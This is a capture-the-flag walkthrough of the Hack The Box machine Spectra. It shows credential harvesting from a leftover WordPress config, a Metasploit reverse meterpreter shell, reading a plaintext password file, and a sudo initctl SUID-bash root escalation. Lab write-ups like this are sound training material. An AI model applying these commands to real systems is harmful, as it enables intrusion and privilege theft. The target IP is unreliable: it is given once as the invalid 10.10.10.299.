We'll start with connecting to HTB network by making connection with .ovpn file and then spin up machine. This box's IP is **10.10.10.299**.

Let's start with nmap scan,

```bash
sudo nmap -A -T4 -p- 10.10.10.299 -oN nmap_scan
```

We have 3 open ports, i.e. 22 (SSH), 80 (HTTP), 3306 (MySQL).

Let's view what technologies are running on website,

```bash
whatweb http://10.10.10.299
```

![image](https://user-images.githubusercontent.com/67465230/158156050-04484f21-e623-418b-b219-4766c5a851a4.png)

This only says that **Nginx** server is running and nothing more.

Let's visit http://10.10.10.299,

![image](https://user-images.githubusercontent.com/67465230/158156063-75df9708-dc20-41a2-9081-f3bdc4fa3d67.png)

seems like this is the page which will redirect us to other page when we click on following links.

Let's click on first one,

![image](https://user-images.githubusercontent.com/67465230/158156075-06109131-041b-455e-9a75-f732936e5526.png)

Seems like we can't access this page. Let's try to click on another page link,

![image](https://user-images.githubusercontent.com/67465230/158156097-57365151-53ab-46dd-b320-6ddb3fba8606.png)

same result. But when you take a close look, there's a domain name associated with this IP, *www.spectra.htb*, so let's resolve this IP in **/etc/hosts** file.

```bash
sudo nano /etc/hosts
```

![image](https://user-images.githubusercontent.com/67465230/158156108-252b457d-aa3f-41a5-9689-8905a003c3e5.png)

save this file and exit.

Now, after refreshing the test link's webpage again, www.spectra.htb/testing/index.htb opens up,

![image](https://user-images.githubusercontent.com/67465230/158156119-2e72fc96-b2b1-4f4c-ad38-4f15fcd66b58.png)

There's nothing much on this webpage. 

Let's try to enumerate the testing folder,

![image](https://user-images.githubusercontent.com/67465230/158156130-95231d62-8c4e-4847-8ec5-b9a43e33bc98.png)

from there we can see that **wp-config.php.save** file seems delicious. Let's view what is inside of it and it's empty! Let's view source code of this file,

![image](https://user-images.githubusercontent.com/67465230/158156148-05514193-1219-49db-957e-efe09e618a4a.png)

We got username and password to login as user.

Let's open first link,

![image](https://user-images.githubusercontent.com/67465230/158156164-a4135728-2dc4-4e6e-a8ed-cc16da20d7e8.png)

www.spectra.htb/main/ opens up and we're presented with wordpress website and there's a user named **administrator** and scrolling down will let us see login page, so we'll try to login using credentials we found.

![image](https://user-images.githubusercontent.com/67465230/158156176-135d701e-88eb-4738-905a-60db415dacd0.png)

putting credentials,  username=`devtest` and password=`*********`. Hitting login button and we won't get logged in which we're supposed to. Let's try to put username as `administrator`,

![image](https://user-images.githubusercontent.com/67465230/158156189-c4760733-36e6-44d5-a021-38ebb292827b.png)

hitting login button,

we got administrator's access to website,

![image](https://user-images.githubusercontent.com/67465230/158156202-ba8dc391-3777-4ce2-a54e-b7e4bcd29abb.png)

Let's now start metasploit-framework to exploit this machine using `msfconsole -q` command,

```bash
search wp_admin_shell
```

![image](https://user-images.githubusercontent.com/67465230/158156218-58b85b2e-0e3f-4940-ac6c-3b191c9fe840.png)

we'll use this module. 

setting options:
- **set username administrator**
- **set password devteam01**
- **set lhost tun0**
- **set rhosts 10.10.10.229**
- **set lport 4444**

![image](https://user-images.githubusercontent.com/67465230/158156224-3e7aa29d-c4d1-4137-a1e4-7f9fafff4b85.png)

check options to see if we've made any mistakes and then hit `run`, after sometime, it'll get us meterpreter shell.

Let's get a proper shell from meterpreter by typing `shell` command, but we'll get a non-functional shell and we've to improve it's functionality, 

```bash
cd /tmp
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![image](https://user-images.githubusercontent.com/67465230/158156232-a90cf5f3-edf3-4732-8495-46a6d7b1e838.png)

we've gain a proper shell.

Let's get the user flag.

```bash
ls -la /home
ls -la /home/katie
```

![image](https://user-images.githubusercontent.com/67465230/158156257-4874ad31-8da5-4630-af08-06fbaa330936.png)

we can't access the user.txt file because we're not katie user. In order to access this flag, we first have to be katie user.

Hopefully, we got into **/opt** directory and there's a file called **autologin.conf.orig**

```bash
cd /opt
ls -la
``` 

![image](https://user-images.githubusercontent.com/67465230/158157495-8542e824-4f75-4e0b-8f66-82f35133c477.png)

this file seems suspicious. Let's view its content.

```bash
cat autologin.conf.orig
```

![image](https://user-images.githubusercontent.com/67465230/158156290-248ae25b-f4e8-459b-86a5-619eb4f54122.png)

It’s a lengthy config script but there’s a line in there that points us to **/etc/autologin**. Let’s check that out:

```bash
ls /etc/autologin
```

![image](https://user-images.githubusercontent.com/67465230/158156321-c6685819-182d-4765-b6f1-3965aca59320.png)

there's a **passwd** file as well. Let's check this also,

```bash
ls -la /etc/autologin/passwd
```

![image](https://user-images.githubusercontent.com/67465230/158156362-a3e82e8a-2693-49e8-848d-87f604b93b83.png)

we can see that owner of this file is root. Let's see if can read this file,

```bash
cat /etc/autologin/passwd
```

![image](https://user-images.githubusercontent.com/67465230/158156374-01b9ba11-d990-4f0d-bdc8-87960eab8359.png)

BOOP!! We got password of katie user (maybe, let's try :) ).

```bash
ssh katie@10.10.10.229
```

![image](https://user-images.githubusercontent.com/67465230/158156383-8bb93ab2-7ce5-4532-b8ef-f5009a983615.png)

we get katie user access and we can also confirm using `whoami` command.

let's get the user flag,

```bash
ls
cat user.txt
```

![image](https://user-images.githubusercontent.com/67465230/158156396-197376a6-3262-4f45-82df-fb191b4f4209.png)

Now, time for **Privilege Escalation**.

Let's check if we can run binaries which can be run as root without providing password,

```bash
sudo -l
```

![image](https://user-images.githubusercontent.com/67465230/158156409-02c7a9fa-73a4-4412-976c-2db1e9e76922.png)

there's a **/sbin/initctl** binary which we can run using `sudo` command. 

```
initctl allows a system administrator to communicate and interact with the Upstart init(8) daemon.

init is the parent of all processes on the system, it is executed by the kernel and is responsible for starting all other processes.
```

So we can use **initctl** to control starting and stopping processes as system. Sounds like a nice simple way to get a root shell. First let’s see what’s **/etc/init**:

```bash
ls -la
``` 

![image](https://user-images.githubusercontent.com/67465230/158156431-d1654b5a-88dd-4911-acce-61eb8f7f8b66.png)

there are 750 files! but we're interested in these test files owned by developers. Let's look at the content of test.conf file,

```bash
cat test.conf
```

![image](https://user-images.githubusercontent.com/67465230/158156445-c48ced59-3628-4699-8623-e5595969b135.png)

Looks like katie has been busy. We can replace the contents of this with our own code, let’s get it to change permissions on **/bin/bash** so we can run it with root permissions as katie.

Let's first find the test process:

```bash
sudo initctl list | grep test
```

![image](https://user-images.githubusercontent.com/67465230/158156456-b61a07d7-86fc-4f28-adf0-68c46fb445bb.png)

It's already stopped, so we can edit conf file and start this process again,

open **test.conf** file with **nano** editor and edit this file and view file content,

```bash
cat test.conf
```

![image](https://user-images.githubusercontent.com/67465230/158156473-3e770ecc-6611-409b-8954-ae787e03751b.png)

We're good to go now and first let's stop the test process so that we can start it again to run it all good,

```bash
sudo /sbin/initctl stop test
```

![image](https://user-images.githubusercontent.com/67465230/158156494-48481277-33e9-4f26-91da-f69d041e5ef3.png)

this will stop the test process.

Let's start the process again,

```bash
sudo /sbin/initctl start test
```

![image](https://user-images.githubusercontent.com/67465230/158156508-15f82586-98c6-4a3d-bed7-a6b9d87603bb.png)

this will start the test process. Now, let's run our bash shell with -p option to gain system access,

```bash
/bin/bash -p
```

![image](https://user-images.githubusercontent.com/67465230/158156521-8c4edb80-4cca-46d3-9931-e0422ec966e8.png)

We get the root shell!!
